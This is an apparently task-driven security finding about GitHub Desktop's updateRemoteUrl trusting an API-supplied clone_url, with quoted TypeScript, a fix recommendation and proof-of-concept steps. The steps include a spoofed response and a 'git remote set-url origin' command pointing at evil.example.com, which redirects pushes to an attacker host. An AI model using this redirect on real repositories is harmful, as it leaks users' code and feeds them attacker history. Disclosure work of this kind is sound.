### Title
Untrusted GitHub API `clone_url` field silently rewrites a repository's git remote, redirecting future pushes/fetches to an attacker-controlled host - (File: `app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
This is the closest Desktop analog to the reported bug class: a security-relevant identity value (the domain separator, tied to the token's `name`) is trusted from one point in time and never re-validated against its true source of truth when the underlying identity data changes, and an attacker who controls that changing data can flip the trust decision silently. In Desktop, the equivalent "identity anchor" is the local git remote URL for `origin`, which `updateRemoteUrl` will silently overwrite based on the `clone_url` field returned by the GitHub/GHES API — without ever validating that the new URL points at the same, trusted host.

### Finding Description
`updateRemoteUrl` is invoked automatically whenever Desktop refreshes a repository's GitHub metadata (`repositoryWithRefreshedGitHubRepository` in `app-store.ts` calls `api.fetchRepository(owner, name)` and then `updateRemoteUrl(gitStore, repository.gitHubRepository, apiRepo)`): [1](#0-0) 

The function itself decides whether to rewrite the local `origin` remote purely from three checks — none of which validate that the *new* URL's host is the same trusted host the user originally configured: [2](#0-1) 

- `protocolsMatch` only compares the URL scheme (`https:` vs `https:`), not the host.
- `remoteUrlUnchanged` only proves the user hasn't *manually* repointed their remote away from the previously cached `cloneURL` — it says nothing about whether the *new* `updatedRemoteUrl` (`apiRepo.clone_url`, taken straight from the API/proxy response) still points at the same host.
- `urlsMatch` is only used to detect that something changed, triggering the rewrite; a mismatch is exactly the condition that flips `!urlsMatch` to `true` and green-lights `gitStore.setRemoteURL(...)`.

`urlMatchesRemote` (used for both checks) enforces hostname/owner/name equality between the two URLs it directly compares, but it is never used to compare `updatedRemoteUrl` against a trusted anchor (e.g. `gitHubRepository.endpoint` or the signed-in account's host): [3](#0-2) 

So if the JSON body returned for `GET /repos/:owner/:name` contains an attacker-controlled `clone_url` (e.g. `https://evil.example.com/owner/name.git`), and the user hasn't manually edited their remote since the last refresh (the common case), `git remote set-url origin` is executed automatically with no user confirmation or host-pinning check: [4](#0-3) 

The realistic delivery mechanism for a spoofed API response is exactly the "git remote/proxy response" vector called out in the task's valid-impact list: Desktop lets a user click through an untrusted TLS certificate warning for a GitHub Enterprise Server connection (common in real deployments with self-signed certs), which is precisely the trust-establishment step a MITM would need: [5](#0-4) [6](#0-5) 

Once that trust decision is made, every subsequent API response from that connection — including the `clone_url` fields used by `updateRemoteUrl` — is fully attacker-controlled, and Desktop applies it to the user's local git configuration with no re-prompt.

### Impact Explanation
The corrupted value is the local git `origin` remote URL, silently rewritten by `git remote set-url`. Once rewritten:
- Subsequent `git push` operations from Desktop (and from the command line, since it's a real git remote) go to the attacker's server instead of the legitimate GitHub/GHES host — "silent corruption of what the user commits or pushes," an explicitly listed valid impact.
- Subsequent `git fetch`/`pull` operations retrieve attacker-controlled history, which the user may merge into their branches believing it originated from the real repository.
- There is no dialog, warning, or diff-review shown to the user; the rewrite happens as a side effect of routine background metadata refresh (`repositoryWithRefreshedGitHubRepository`, called from many code paths in `app-store.ts`).

### Likelihood Explanation
This requires the attacker to be positioned to alter the API response for `fetchRepository`, most plausibly by MITM'ing a GitHub Enterprise Server connection the user has already been prompted to (and did) "continue unsafely" through, or by a compromised/malicious GHES instance itself. This is not local/physical access, not leaked credentials, and not a social-engineering-in-the-app sense — it's the exact "git remote/proxy response" attacker model the task explicitly validates. The gap is real: nowhere in `updateRemoteUrl` or `urlMatchesRemote` is `apiRepo.clone_url`'s hostname checked against the trusted account endpoint before it's written to the local git config.

### Recommendation
Before calling `gitStore.setRemoteURL`, validate that `updatedRemoteUrl`'s hostname matches the trusted endpoint associated with the `Account`/`GitHubRepository` (`gitHubRepository.endpoint`), not merely that its owner/name/protocol are internally consistent. If the hostname differs from the known trusted endpoint, require explicit user confirmation before rewriting the remote, analogous to fixing a stale trust anchor by re-deriving it from — and validating it against — the authoritative source instead of blindly trusting mutable input.

### Proof of Concept
1. Add a GitHub Enterprise Server account in Desktop pointed at `https://ghes.example.com`, using a self-signed certificate, and click "Continue"/"Add certificate" on the untrusted-certificate dialog (`untrusted-certificate.tsx`) — establishing the MITM position.
2. Clone/track a repository from that endpoint; Desktop stores `gitHubRepository.cloneURL = https://ghes.example.com/owner/name.git` and the local remote `origin` is set to the same URL.
3. As the MITM (or malicious GHES admin), intercept/serve the response to `GET /api/v3/repos/owner/name` (triggered internally whenever Desktop calls `repositoryWithRefreshedGitHubRepository`) and set `"clone_url": "https://evil.example.com/owner/name.git"` (same protocol, so `protocolsMatch` passes; the user hasn't touched their remote, so `remoteUrlUnchanged` passes).
4. Observe that `updateRemoteUrl` executes `git remote set-url origin https://evil.example.com/owner/name.git` with no prompt.
5. The next `git push` from Desktop (or the command line, since the change is a real git config write) silently targets `evil.example.com` instead of the legitimate host.

  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }

export function urlMatchesRemote(url: string | null, remote: IRemote): boolean {
  if (url == null) {
    return false
  }

  const cloneUrl = parseRemote(url)
  const remoteUrl = parseRemote(remote.url)

  if (remoteUrl == null || cloneUrl == null) {
    return false
  }

  if (!caseInsensitiveEquals(remoteUrl.hostname, cloneUrl.hostname)) {
    return false
  }

  if (remoteUrl.owner == null || cloneUrl.owner == null) {
    return false
  }

  if (remoteUrl.name == null || cloneUrl.name == null) {
    return false
  }

  return (
    caseInsensitiveEquals(remoteUrl.owner, cloneUrl.owner) &&
    caseInsensitiveEquals(remoteUrl.name, cloneUrl.name)
  )
}
